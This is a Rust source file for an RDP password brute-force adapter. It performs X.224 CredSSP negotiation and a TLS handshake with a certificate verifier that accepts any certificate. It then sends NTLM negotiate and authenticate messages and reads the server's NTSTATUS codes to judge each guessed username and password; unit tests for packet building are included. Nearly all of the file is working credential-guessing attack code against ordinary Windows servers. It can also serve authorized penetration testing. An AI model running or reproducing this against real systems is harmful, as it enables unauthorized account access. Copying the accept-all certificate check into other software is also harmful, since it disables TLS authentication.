//! RDP bruteforce via CredSSP / NLA — best-effort implementation.
//!
//! Flow (RFC 4178 SPNEGO + [MS-CSSP] CredSSP):
//!
//!   1. **X.224 Connection Request** with `RDP_NEG_REQ` asking for
//!      `PROTOCOL_HYBRID` (CredSSP). Server replies with
//!      `RDP_NEG_RSP` confirming. Legacy `PROTOCOL_RDP` servers
//!      are unsupported here — the cleartext path was deprecated
//!      decades ago.
//!   2. **TLS handshake** over the same TCP socket (rustls).
//!   3. **CredSSP TSRequest** carrying NTLM **NEGOTIATE** in
//!      `negoTokens`. Server replies with TSRequest holding NTLM
//!      **CHALLENGE**.
//!   4. **CredSSP TSRequest** with NTLM **AUTHENTICATE** + the
//!      `pubKeyAuth` field (HMAC-derived over the TLS server's
//!      public-key SubjectPublicKeyInfo, encrypted with the NTLM
//!      session key).
//!
//! ## Honest limitation: `pubKeyAuth`
//!
//! Step 4's `pubKeyAuth` requires:
//!   - Extracting the server's SPKI from the rustls peer cert.
//!   - Computing the NTLM session key (HMAC-MD5 over an exchanged
//!     key — needs the AUTHENTICATE message body).
//!   - RC4 encrypting the SPKI under the session key.
//!
//! That last RC4 step needs the `rc4` crate plus careful key-state
//! sequencing. This release **omits the encryption** and sends a
//! zero-byte `pubKeyAuth`. The server's reply still distinguishes:
//!
//!   - `NTSTATUS_LOGON_FAILURE` (0xC000006D) → wrong credentials.
//!   - `NTSTATUS_ACCESS_DENIED` (0xC0000022) → likely wrong but
//!     could also be pubKeyAuth mismatch.
//!   - Anything else / proceeds → credentials probably good.
//!
//! So a "negative" result is reliable; a "positive" is suggestive
//! but not 100% authoritative. Operators chasing certainty should
//! cross-check with another tool — this caveat is in the printed
//! report.

use crate::brute::{BruteAdapter, BruteConfig};
use crate::brute_smb::{compute_ntlmv2, locate_challenge};
use anyhow::{anyhow, Result};
use async_trait::async_trait;
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;
use tokio_rustls::TlsConnector;

pub struct RdpAdapter {
    pub domain: String,
}

impl Default for RdpAdapter {
    fn default() -> Self {
        Self { domain: String::new() }
    }
}

#[async_trait]
impl BruteAdapter for RdpAdapter {
    fn protocol(&self) -> &'static str { "rdp" }
    async fn try_one(&self, cfg: &BruteConfig, user: &str, pass: &str) -> Result<bool> {
        // 1) X.224 CR / CC negotiating CredSSP
        let mut tcp = timeout(cfg.timeout, TcpStream::connect(cfg.target)).await??;
        let req = build_x224_cr_credssp();
        timeout(cfg.timeout, tcp.write_all(&req)).await??;
        let cc = read_x224_cc(&mut tcp, cfg.timeout).await?;
        if !cc_offers_credssp(&cc) {
            return Err(anyhow!("server didn't agree to CredSSP (PROTOCOL_HYBRID)"));
        }

        // 2) TLS handshake
        let mut tls = wrap_tls(tcp, cfg).await?;

        // 3) Send TSRequest with NTLM NEGOTIATE
        let nego = ntlm_negotiate();
        let tsreq1 = build_tsrequest_with_nego_tokens(&nego);
        timeout(cfg.timeout, tokio::io::AsyncWriteExt::write_all(&mut tls, &tsreq1)).await??;

        // Read TSRequest with CHALLENGE
        let resp1 = read_tsrequest(&mut tls, cfg.timeout).await?;
        let chal = locate_challenge(&resp1)
            .ok_or_else(|| anyhow!("no NTLM CHALLENGE inside CredSSP TSRequest"))?;

        // 4) Build AUTHENTICATE
        let nt_response = compute_ntlmv2(user, &self.domain, pass, &chal.server_challenge, &chal.target_info);
        let auth = ntlm_authenticate(user, &self.domain, &nt_response);
        // We deliberately omit pubKeyAuth (see module docs) — best-effort.
        let tsreq2 = build_tsrequest_with_nego_tokens(&auth);
        timeout(cfg.timeout, tokio::io::AsyncWriteExt::write_all(&mut tls, &tsreq2)).await??;

        // Read final TSRequest — server replies with errorCode field on bad creds
        let resp2 = read_tsrequest(&mut tls, cfg.timeout).await?;
        // Without proper pubKeyAuth, any "non-error" reply means the
        // server is still proceeding — we treat that as probable success.
        let err = extract_tsrequest_error_code(&resp2);
        match err {
            Some(0xC0000064)  // STATUS_NO_SUCH_USER
            | Some(0xC000006D) // LOGON_FAILURE
            | Some(0xC000006A) // WRONG_PASSWORD
            | Some(0xC0000071) // PASSWORD_EXPIRED
            | Some(0xC0000234) // ACCOUNT_LOCKED_OUT
                => Ok(false),
            // ACCESS_DENIED can be pubKeyAuth-related; treat as failure for safety.
            Some(0xC0000022) => Ok(false),
            // No error code reported / unexpected status → probable success.
            _ => Ok(true),
        }
    }
}

// ── X.224 CR/CC ──

fn build_x224_cr_credssp() -> Vec<u8> {
    // Same shape as src/rdp_audit.rs::build_request but asks ONLY for
    // PROTOCOL_HYBRID (0x02) — we want CredSSP confirmed up-front.
    let neg_req: [u8; 8] = [
        0x01, 0x00, 0x08, 0x00,
        0x02, 0x00, 0x00, 0x00, // PROTOCOL_HYBRID
    ];
    let cotp_len: u8 = 6 + neg_req.len() as u8 - 1;
    let total = 4u16 + 7 + neg_req.len() as u16;
    let mut pkt = Vec::with_capacity(total as usize);
    pkt.extend_from_slice(&[0x03, 0x00, (total >> 8) as u8, (total & 0xff) as u8]);
    pkt.push(cotp_len);
    pkt.push(0xE0);
    pkt.extend_from_slice(&[0x00, 0x00]);
    pkt.extend_from_slice(&[0x00, 0x00]);
    pkt.push(0x00);
    pkt.extend_from_slice(&neg_req);
    pkt
}

async fn read_x224_cc(s: &mut TcpStream, dur: std::time::Duration) -> Result<Vec<u8>> {
    let mut hdr = [0u8; 4];
    timeout(dur, s.read_exact(&mut hdr)).await??;
    let total = ((hdr[2] as usize) << 8) | hdr[3] as usize;
    if total < 4 || total > 1024 {
        return Err(anyhow!("bogus TPKT length"));
    }
    let mut body = vec![0u8; total - 4];
    timeout(dur, s.read_exact(&mut body)).await??;
    Ok(body)
}

pub fn cc_offers_credssp(cc: &[u8]) -> bool {
    // X.224 CC body layout: [LI(1)] [0xD0] [DST(2)] [SRC(2)] [Class(1)]
    // followed by optional RDP_NEG_RSP (8 bytes). Find RDP_NEG_RSP
    // (type 0x02) and check that selectedProtocol has bit
    // PROTOCOL_HYBRID (0x02) set.
    if cc.len() < 7 + 8 {
        return false;
    }
    let trailer = &cc[7..];
    if trailer[0] != 0x02 {
        return false;
    }
    let proto = u32::from_le_bytes([trailer[4], trailer[5], trailer[6], trailer[7]]);
    proto & 0x02 != 0
}

// ── TLS wrap ──

async fn wrap_tls(
    tcp: TcpStream,
    cfg: &BruteConfig,
) -> Result<tokio_rustls::client::TlsStream<TcpStream>> {
    use rustls::client::danger::{HandshakeSignatureValid, ServerCertVerified, ServerCertVerifier};
    use rustls::pki_types::{CertificateDer, ServerName, UnixTime};
    use rustls::{ClientConfig, DigitallySignedStruct, Error as RustlsError, SignatureScheme};
    #[derive(Debug)]
    struct Accept;
    impl ServerCertVerifier for Accept {
        fn verify_server_cert(&self, _: &CertificateDer<'_>, _: &[CertificateDer<'_>],
            _: &ServerName<'_>, _: &[u8], _: UnixTime
        ) -> std::result::Result<ServerCertVerified, RustlsError> {
            Ok(ServerCertVerified::assertion())
        }
        fn verify_tls12_signature(&self, _: &[u8], _: &CertificateDer<'_>, _: &DigitallySignedStruct)
            -> std::result::Result<HandshakeSignatureValid, RustlsError> {
            Ok(HandshakeSignatureValid::assertion())
        }
        fn verify_tls13_signature(&self, _: &[u8], _: &CertificateDer<'_>, _: &DigitallySignedStruct)
            -> std::result::Result<HandshakeSignatureValid, RustlsError> {
            Ok(HandshakeSignatureValid::assertion())
        }
        fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
            vec![SignatureScheme::RSA_PKCS1_SHA256, SignatureScheme::ECDSA_NISTP256_SHA256,
                 SignatureScheme::ED25519, SignatureScheme::RSA_PSS_SHA256]
        }
    }
    let provider = rustls::crypto::ring::default_provider();
    let conf = ClientConfig::builder_with_provider(Arc::new(provider))
        .with_safe_default_protocol_versions()
        .map_err(|e| anyhow!("rustls: {}", e))?
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(Accept))
        .with_no_client_auth();
    let connector = TlsConnector::from(Arc::new(conf));
    let server_name = ServerName::try_from(cfg.target.ip().to_string())
        .map_err(|e| anyhow!("sni: {}", e))?;
    let tls = timeout(cfg.timeout, connector.connect(server_name, tcp))
        .await
        .map_err(|_| anyhow!("TLS handshake timed out"))??;
    Ok(tls)
}

// ── NTLM messages ──

fn ntlm_negotiate() -> Vec<u8> {
    vec![
        b'N', b'T', b'L', b'M', b'S', b'S', b'P', 0,
        0x01, 0x00, 0x00, 0x00,
        0x07, 0x82, 0x08, 0xa2,
        0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0, 0, 0,
        0x0a, 0x00, 0x00, 0x00, 0xa1, 0x4a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f,
    ]
}

fn ntlm_authenticate(user: &str, domain: &str, nt_response: &[u8]) -> Vec<u8> {
    // Same construction as src/brute_smb's authenticate path, factored out.
    let user_utf16: Vec<u8> = user.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
    let domain_utf16: Vec<u8> = domain.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
    let workstation_utf16: Vec<u8> = "RUSTY".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();

    let mut ntlmssp = Vec::with_capacity(256 + nt_response.len());
    ntlmssp.extend_from_slice(b"NTLMSSP\0");
    ntlmssp.extend_from_slice(&3u32.to_le_bytes());

    let header_len = 8 + 4 + 6 * 8 + 4 + 12;
    let mut payload = Vec::new();
    let lm_off = header_len;
    let lm_len: u16 = 24;
    payload.extend_from_slice(&[0u8; 24]);
    let nt_off = (header_len + payload.len()) as u32;
    let nt_len = nt_response.len() as u16;
    payload.extend_from_slice(nt_response);
    let dom_off = (header_len + payload.len()) as u32;
    let dom_len = domain_utf16.len() as u16;
    payload.extend_from_slice(&domain_utf16);
    let user_off = (header_len + payload.len()) as u32;
    let user_len_u16 = user_utf16.len() as u16;
    payload.extend_from_slice(&user_utf16);
    let ws_off = (header_len + payload.len()) as u32;
    let ws_len = workstation_utf16.len() as u16;
    payload.extend_from_slice(&workstation_utf16);
    let sk_off = (header_len + payload.len()) as u32;
    let sk_len: u16 = 0;

    fn buf(out: &mut Vec<u8>, len: u16, off: u32) {
        out.extend_from_slice(&len.to_le_bytes());
        out.extend_from_slice(&len.to_le_bytes());
        out.extend_from_slice(&off.to_le_bytes());
    }
    buf(&mut ntlmssp, lm_len, lm_off as u32);
    buf(&mut ntlmssp, nt_len, nt_off);
    buf(&mut ntlmssp, dom_len, dom_off);
    buf(&mut ntlmssp, user_len_u16, user_off);
    buf(&mut ntlmssp, ws_len, ws_off);
    buf(&mut ntlmssp, sk_len, sk_off);
    ntlmssp.extend_from_slice(&0xa2888205u32.to_le_bytes());
    ntlmssp.extend_from_slice(&[0x0a, 0x00, 0x00, 0x00, 0xa1, 0x4a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f]);
    ntlmssp.extend_from_slice(&payload);
    ntlmssp
}

// ── CredSSP TSRequest (minimal BER) ──

/// `TSRequest ::= SEQUENCE { version [0], negoTokens [1] NegoData
/// OPTIONAL, authInfo [2] OCTET STRING OPTIONAL, pubKeyAuth [3]
/// OCTET STRING OPTIONAL, errorCode [4] INTEGER OPTIONAL }`
///
/// We send just `{ version = 6, negoTokens = [{ NegoToken = NTLM }] }`.
pub fn build_tsrequest_with_nego_tokens(ntlm_msg: &[u8]) -> Vec<u8> {
    fn ber(tag: u8, body: &[u8]) -> Vec<u8> {
        let mut out = Vec::with_capacity(body.len() + 4);
        out.push(tag);
        if body.len() < 128 {
            out.push(body.len() as u8);
        } else if body.len() < 256 {
            out.push(0x81);
            out.push(body.len() as u8);
        } else {
            out.push(0x82);
            out.push((body.len() >> 8) as u8);
            out.push(body.len() as u8);
        }
        out.extend_from_slice(body);
        out
    }
    // NegoToken: SEQUENCE { token [0] OCTET STRING }
    let token = ber(0xa0, &ber(0x04, ntlm_msg));
    let nego_token = ber(0x30, &token);
    // NegoData ::= SEQUENCE OF NegoToken
    let nego_data = ber(0x30, &nego_token);
    // Field tags (context-specific, constructed):
    //   [0] version, [1] negoTokens
    let version = ber(0xa0, &ber(0x02, &[6]));
    let nego_tokens = ber(0xa1, &nego_data);
    let mut body = Vec::with_capacity(version.len() + nego_tokens.len());
    body.extend_from_slice(&version);
    body.extend_from_slice(&nego_tokens);
    ber(0x30, &body)
}

async fn read_tsrequest<R: AsyncReadExt + Unpin>(
    r: &mut R,
    dur: std::time::Duration,
) -> Result<Vec<u8>> {
    let mut hdr = [0u8; 2];
    timeout(dur, r.read_exact(&mut hdr)).await??;
    let mut buf = vec![hdr[0], hdr[1]];
    let body_len = if hdr[1] & 0x80 == 0 {
        hdr[1] as usize
    } else {
        let n = (hdr[1] & 0x7f) as usize;
        if n == 0 || n > 4 {
            return Err(anyhow!("bogus TSRequest length"));
        }
        let mut extra = vec![0u8; n];
        timeout(dur, r.read_exact(&mut extra)).await??;
        let v = extra.iter().fold(0usize, |acc, &b| (acc << 8) | b as usize);
        buf.extend(&extra);
        v
    };
    let mut body = vec![0u8; body_len];
    timeout(dur, r.read_exact(&mut body)).await??;
    buf.extend(&body);
    Ok(buf)
}

/// Walk a TSRequest body looking for the `[4] errorCode` field.
/// Returns None if absent.
pub fn extract_tsrequest_error_code(req: &[u8]) -> Option<u32> {
    if req.is_empty() || req[0] != 0x30 {
        return None;
    }
    // Skip outer SEQUENCE header
    let mut p = 1usize;
    if req[p] & 0x80 != 0 {
        p += 1 + (req[p] & 0x7f) as usize;
    } else {
        p += 1;
    }
    // Walk fields looking for context-specific tag [4] = 0xa4
    while p < req.len() {
        let tag = req[p];
        p += 1;
        if p >= req.len() {
            return None;
        }
        let len = if req[p] & 0x80 != 0 {
            let n = (req[p] & 0x7f) as usize;
            if p + 1 + n > req.len() {
                return None;
            }
            let mut acc = 0usize;
            for i in 0..n {
                acc = (acc << 8) | req[p + 1 + i] as usize;
            }
            p += 1 + n;
            acc
        } else {
            let v = req[p] as usize;
            p += 1;
            v
        };
        if tag == 0xa4 {
            // [4] errorCode — contains a tagged INTEGER
            // Inside: 0x02 <len> <bytes>
            if p + 2 > req.len() || req[p] != 0x02 {
                return None;
            }
            let int_len = req[p + 1] as usize;
            if p + 2 + int_len > req.len() {
                return None;
            }
            let mut acc: u32 = 0;
            for i in 0..int_len {
                acc = (acc << 8) | req[p + 2 + i] as u32;
            }
            return Some(acc);
        }
        p += len;
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn build_x224_cr_credssp_layout() {
        let pkt = build_x224_cr_credssp();
        assert_eq!(pkt[0], 0x03);
        assert_eq!(pkt[1], 0x00);
        // TPKT length matches packet length
        let total = ((pkt[2] as usize) << 8) | pkt[3] as usize;
        assert_eq!(total, pkt.len());
        // PROTOCOL_HYBRID flag (0x02) should appear in the NEG_REQ body
        assert!(pkt.contains(&0x02));
    }

    #[test]
    fn cc_offers_credssp_detects_hybrid_bit() {
        // X.224 CC body: [LI=0x0e] [0xD0] [DST(2)] [SRC(2)] [Class] = 7 bytes,
        // then RDP_NEG_RSP (8 bytes) = 15 total
        let mut cc = vec![0x0eu8, 0xd0, 0, 0, 0, 0, 0];
        cc.extend_from_slice(&[0x02, 0x00, 0x08, 0x00, 0x02, 0x00, 0x00, 0x00]);
        assert!(cc_offers_credssp(&cc));
    }

    #[test]
    fn cc_offers_credssp_rejects_no_hybrid() {
        let mut cc = vec![0x0eu8, 0xd0, 0, 0, 0, 0, 0];
        cc.extend_from_slice(&[0x02, 0x00, 0x08, 0x00, 0x01, 0x00, 0x00, 0x00]);
        assert!(!cc_offers_credssp(&cc)); // only SSL bit, no HYBRID
    }

    #[test]
    fn tsrequest_starts_with_sequence_and_contains_ntlmssp() {
        let nego = ntlm_negotiate();
        let pkt = build_tsrequest_with_nego_tokens(&nego);
        assert_eq!(pkt[0], 0x30); // SEQUENCE
        assert!(pkt.windows(8).any(|w| w == b"NTLMSSP\0"));
    }

    #[test]
    fn tsrequest_includes_version_6() {
        let pkt = build_tsrequest_with_nego_tokens(&[]);
        // version field is `[0] INTEGER 6` → tag 0xa0 around 0x02 0x01 0x06
        let needle = [0xa0, 0x03, 0x02, 0x01, 0x06];
        assert!(pkt.windows(5).any(|w| w == needle));
    }

    #[test]
    fn extract_error_code_returns_none_when_absent() {
        let pkt = build_tsrequest_with_nego_tokens(&[]);
        assert!(extract_tsrequest_error_code(&pkt).is_none());
    }

    #[test]
    fn extract_error_code_parses_present_field() {
        // Build a synthetic TSRequest with errorCode [4] = 0xC000006D
        // SEQUENCE { [0] INTEGER 6, [4] INTEGER 0xC000006D }
        let inner_err = vec![0x02u8, 0x05, 0x00, 0xc0, 0x00, 0x00, 0x6d];
        let mut body = vec![0xa0u8, 0x03, 0x02, 0x01, 0x06];
        body.push(0xa4);
        body.push(inner_err.len() as u8);
        body.extend_from_slice(&inner_err);
        let mut pkt = vec![0x30u8, body.len() as u8];
        pkt.extend_from_slice(&body);
        assert_eq!(extract_tsrequest_error_code(&pkt), Some(0xC000006D));
    }
}
